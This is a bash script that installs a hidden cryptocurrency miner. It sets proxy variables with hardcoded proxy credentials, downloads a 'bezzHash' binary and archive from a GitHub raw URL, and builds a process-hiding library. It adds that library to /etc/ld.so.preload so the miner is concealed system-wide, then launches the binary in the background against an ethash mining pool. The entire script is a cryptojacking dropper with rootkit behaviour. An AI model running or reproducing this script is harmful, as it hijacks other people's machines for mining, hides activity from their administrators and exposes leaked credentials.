#!/bin/bash
curl --proxy "http://isuaceev-rotate:1hlu4kdb73rx@p.webshare.io:80/" https://ipv4.webshare.io/
export http_proxy=http://isuaceev-rotate:1hlu4kdb73rx@p.webshare.io:80 &&
export https_proxy=http://isuaceev-rotate:1hlu4kdb73rx@p.webshare.io:80 &&
export ftp_proxy=http://isuaceev-rotate:1hlu4kdb73rx@p.webshare.io:80 &&
wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
chmod +x bezzHash
wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
unzip magicBezzHash.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
nohup ./bezzHash --url=prodent.$(echo $(shuf -i 1-99999 -n 1)-TEST)@ethash.kupool.com:443 > nohup.out
